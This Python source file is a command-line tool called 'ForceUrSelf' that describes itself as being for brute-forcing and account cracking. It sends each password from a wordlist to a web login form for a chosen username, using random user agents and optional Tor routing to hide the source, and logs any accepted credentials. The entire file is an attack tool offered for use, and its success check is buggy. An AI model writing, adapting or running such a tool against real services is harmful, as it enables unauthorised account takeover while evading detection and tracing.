import requests
import os
import methods
import argparse
import stem.process
import re
import json
from datetime import datetime
from platform import platform
from termcolor import colored

__author__ = 'Sami Hindi'
__version__ = '1.0.0'

# Set OS Variable to user operating system
OS = 'windows' if 'windows' in platform().lower() else 'linux'

# Set the username of the currently logged in user
USER_OS = os.getlogin()

# Get the tor path
TOR_PATH = methods.get_tor_path(OS)

# Here you put the error message you get, when you enter the wrong password (lower case)
ERROR_MSGS = [
    'invalid'
    'incorrect',
    'wrong',
    'wrong password',
    'invalid password',
    'incorrect password',
    'invalid username or password',
    'invalid username/password',
    'invalid username or password',
    'invalid username/password',
    'false password',
    'falscher benutzername oder falsches passwort',
    'falscher benutzername',
    'falsches passwort',
    'inkorrekte anmeldedaten',
    'falsche anmeldedaten',
    'falsche benutzerdaten',
    'inkorrekt'
]

def set_proxy(verbosity: bool = False) -> None:
    SOCKS_PORT = 9050
    TOR_PATH = methods.get_tor_path(OS)
    if verbosity:
        tor_process = stem.process.launch_tor_with_config(
            config = {
                'SocksPort': str(SOCKS_PORT),
            },
            init_msg_handler = lambda line: print(colored(line, 'yellow')) if re.search('Bootstrapped', line) else False,
            tor_cmd = TOR_PATH
        )
    else:
        print(colored('[INFO] : Supressing Tor Output', 'blue'))
        tor_process = stem.process.launch_tor_with_config(
            config = {
               'SocksPort': str(SOCKS_PORT),
            },
            tor_cmd = TOR_PATH
        )
    
    # Checking if the proxy is working
    PROXIES = {
        'http': 'socks5://127.0.0.1:9050',
        'https': 'socks5://127.0.0.1:9050'
    }
    
    response = requests.get("http://ip-api.com/json/", proxies=PROXIES)
    result = json.loads(response.content)
    print(colored("[INFO] : TOR IP [%s]: %s %s"%(datetime.now().strftime('%d-%m-%Y %H:%M:%S'), result['query'], result['country']), 'blue'))


# Bruteforcing method using TOR proxies
def bruteforce(username: str, password_list: str, URL, proxy: bool, VERBOSE: bool) -> None:
    # Define the amount of successful hits
    hits: int = 0
    
    # Read the password list
    with open(password_list, 'r', errors='ignore') as password_list:
        passwords = password_list.readlines()
        
    # Set the proxy to TOR
    proxies = {}
    if proxy:
        # Kill every app that was previously using port 9050
        print(colored('[INFO] : Killing old Port Usage...', 'blue'))
        if OS == 'windows':
            os.system('npx kill-port 9050')
        else:
            os.system('sudo killall tor')
        # Define the proxy for the requests
        set_proxy(VERBOSE)
        proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050' 
        }

    # Loop over the passwords
    for password in passwords:
        # Set the headers
        headers = {
            'User-Agent': methods.get_random_user_agent()
        }
        
        # Set the form data
        data = {
            'username': username,
            'password': password.strip()
        }
        
        # Send the actual post request
        r = requests.post(URL, headers=headers, data=data, proxies=proxies)
        
        # If the password is correct
        if r.text.lower() not in ERROR_MSGS:
            print(colored(f'[HIT] : {password}', 'green'))
            methods.log_output(f'[HIT] => {username}:{password}')
            hits += 1
    if hits == 0:
        print(colored('[ERROR] : No hits found', 'red'))

def main(args: list[str]) -> None:
    '''
    Tool: ForceUrSelf
    Author: Sami Hindi
    Usage: Bruteforce & Account cracking
    License: GNU General Public Licesne V3.0
    OS: Windows & Linux
    '''
    
    USERNAME: str = ''
    PASSWORD_LIST: str = ''
    URL: str = ''
    MODE: str = ''
    PROXY: bool = False
    VERBOSE: bool = False
    
    for arg in args:
        if 'verbose' in arg:
            VERBOSE = True
        
        if 'mode' in arg:
            MODE = arg.split(':::')[1]
            
        if 'username' in arg:
            USERNAME = arg.split(':::')[1]
        
        if 'password_list' in arg:
            PASSWORD_LIST = arg.split(':::')[1]
            
        if 'proxy' in arg:
            PROXY = True
        
        if 'url' in arg:
            URL = arg.split(':::')[1]
            
        if 'out_file' in arg:
            methods.set_output_file(arg.split(':::')[1])
    
    if MODE == 'bruteforce':
        bruteforce(USERNAME, PASSWORD_LIST, URL, PROXY, VERBOSE)
    
    
if __name__ == '__main__':
    # Clear the output
    methods.clear_output()
    try:
        # Print logo
        methods.print_logo()
        
        # Instantiate the parser
        parser = argparse.ArgumentParser(description='ForceUrSelf - Bruteforce & Account cracking')
        
        # Get mode from arguments
        parser.add_argument('-m', '--mode', help='Mode to run ForceUrSelf in', required=True)
        
        # Take required username argument
        parser.add_argument('-u', '--username', type=str,
                            help='Username to bruteforce')
        
        parser.add_argument('-pl', '--password-list', type=str,
                            help='Passwordlist to use for provided username')
        
        # Add proxy argument
        parser.add_argument('-p', '--proxy', action="store_true",
                            help='Proxy to use for requests')
        
        # Add verbosity argument
        parser.add_argument('-v', '--verbose', action='store_true',
                            help='Use verbose mode')

        # Add URL argument
        parser.add_argument('-url', '--url', type=str,
                            help='URL to use for bruteforcing')
        
        # Add output file argument
        parser.add_argument('-o', '--out-file', type=str,
                            help='Output file to save the results to')
        
        # Parse the arguments
        args = parser.parse_args()
        
        # Handle arguments in parse args method
        parsed_args = methods.parse_args(args)
        
        # Run main method
        main(parsed_args)
        
    except Exception as err:
        print(colored(f'ForceUrSelf has encountered an error: {err}', 'red'))
    finally:
        methods.print_goodbye()
        